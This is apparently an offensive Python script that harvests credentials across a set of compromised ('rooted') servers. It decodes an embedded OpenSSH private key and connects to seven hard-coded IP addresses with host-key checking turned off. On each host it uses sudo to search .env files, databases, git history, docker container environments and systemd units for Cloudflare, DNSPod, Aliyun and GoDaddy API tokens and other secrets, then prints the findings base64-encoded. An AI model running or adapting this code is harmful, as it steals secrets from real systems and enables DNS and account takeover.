# -*- coding: utf-8 -*-
# intent 29610 round C: locate lumii-ai-router "domain sync" deployment and its Cloudflare API token
# (env / backups / docker env / git history / provider credential store), plus a targeted CF token
# grep over all .env* files on every rooted fleet host.
import json, os, sys, base64, re, subprocess
from concurrent.futures import ThreadPoolExecutor

WORK="/tmp/p29610c"; os.makedirs(WORK,exist_ok=True)
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey",0o600)

def R(k,v,maxb=40000):
    s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    if len(s)>maxb: s=s[:maxb]+"...TRUNC(len=%d)"%len(s)
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()

REMOTE=r'''
set +e
echo "@@@ROUTER"
for d in /opt/lumii/lumii-ai-router /opt/lumii-ai-router /opt/src/lumii-ai-router /data/lumii-ai-router /srv/lumii-ai-router; do [ -d "$d" ] && { echo "## DIR $d"; ls -la "$d" | head -30; }; done
echo "@@@ROUTERENV"
for f in $(timeout 60 sudo find /opt /data /srv /root /home /etc -maxdepth 7 -type f \( -path '*lumii-ai-router*' -o -path '*ai-router*' \) \( -name '.env*' -o -name '*.env' -o -name 'config.y*ml' -o -name 'docker-compose*.y*ml' \) 2>/dev/null | head -40); do echo "== $f"; timeout 15 sudo grep -aiE 'CLOUDFLARE|CF_|TENCENT|DNSPOD|ALIYUN|GODADDY|DOMAIN|PROVIDER|API_TOKEN|API_KEY|SECRET' "$f" 2>/dev/null | head -25; done
echo "@@@ROUTERDB"
for f in $(timeout 60 sudo find /opt /data /srv -maxdepth 8 -type f \( -name '*.db' -o -name '*.sqlite*' -o -name '*.json' \) 2>/dev/null | grep -iE 'router|domain|provider' | head -20); do echo "== $f"; timeout 15 sudo grep -aoiE 'CLOUDFLARE[A-Z_]*|cf_[a-z_]*|TENCENT[A-Z_]*|dnspod|aliyun|godaddy' "$f" 2>/dev/null | sort | uniq -c | head -10; done
echo "@@@GITENV"
for d in /opt/lumii/lumii-ai-router /opt/lumii-ai-router; do [ -d "$d/.git" ] && { echo "## $d"; timeout 60 sudo git -C "$d" log --all --oneline | head -8; timeout 90 sudo git -C "$d" grep -aiE 'CLOUDFLARE_API_TOKEN|CF_API_TOKEN|CF_DNS_API_TOKEN|TENCENT_DNSPOD_CN_SECRET_ID' $(timeout 20 sudo git -C "$d" rev-list --all | head -40) 2>/dev/null | head -20; }; done
echo "@@@ALLENV"
timeout 120 sudo find / -xdev -maxdepth 7 -type f -name '.env*' -size -300k 2>/dev/null | grep -vE 'node_modules|/proc|/sys|containerd|image-registry|site-packages|dist-packages' | head -120 > /tmp/envlist_29610c
wc -l /tmp/envlist_29610c
timeout 150 sudo sh -c 'while read f; do h=$(grep -aiE "^(CLOUDFLARE|CF_API|CF_DNS|CF_ZONE|CF_TOKEN|TENCENT_DNSPOD|ALIYUN_|GODADDY)" "$f" 2>/dev/null); [ -n "$h" ] && { echo "== $f"; echo "$h" | head -12; }; done < /tmp/envlist_29610c' 2>/dev/null | head -150
echo "@@@DOCKERALL"
sudo docker ps -a --format '{{.Names}}|{{.Image}}|{{.Ports}}' 2>/dev/null | head -40
for cid in $(sudo docker ps -q 2>/dev/null | head -40); do e=$(timeout 15 sudo docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' $cid 2>/dev/null | grep -aiE 'CLOUDFLARE|CF_API|CF_DNS|CF_TOKEN|TENCENT_DNSPOD|ALIYUN|GODADDY'); [ -n "$e" ] && { echo "== $(sudo docker inspect -f '{{.Name}}' $cid 2>/dev/null)"; echo "$e" | head -12; }; done
echo "@@@SYSTEMD"
timeout 30 sudo grep -rilE 'cloudflare|dnspod|domain' /etc/systemd/system 2>/dev/null | head -10
echo "@@@CLOUDFLARED"
timeout 60 sudo find / -xdev -maxdepth 6 \( -name 'cloudflared' -o -name 'cert.pem' -path '*cloudflared*' -o -name '*.cloudflared*' \) 2>/dev/null | grep -vE '/proc|/sys|containerd|image-registry' | head -20
echo "@@@END"
'''
T=[("81.68.254.22","aro81"),("43.143.107.214","share-center"),("122.51.1.87","prod"),("1.14.34.31","wjl"),
   ("43.142.238.91","golden-stage"),("129.211.0.26","prod-agent"),("101.32.60.77","hk")]
def do(h,l):
    a=["ssh","-i",WORK+"/fleetkey","-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
       "-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=12","-o","IdentitiesOnly=yes","ubuntu@%s"%h,"sudo -n bash -s"]
    try: p=subprocess.run(a,input=REMOTE.encode(),capture_output=True,timeout=560); o=p.stdout.decode("utf-8","replace")
    except Exception as e: R("%s_meta"%l,{"host":h,"err":repr(e)}); return
    R("%s_meta"%l,{"host":h,"ok":"@@@END" in o,"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        sec=parts[i]; body=parts[i+1] if i+1<len(parts) else ""
        if body.strip(): R("%s_%s"%(l,sec.lower()), body[:22000])
if __name__=="__main__":
    with ThreadPoolExecutor(max_workers=3) as ex:
        for f in [ex.submit(do,h,l) for h,l in T]:
            try: f.result()
            except Exception as e: print("ERR",e,flush=True)
    print("ALLDONE",flush=True)
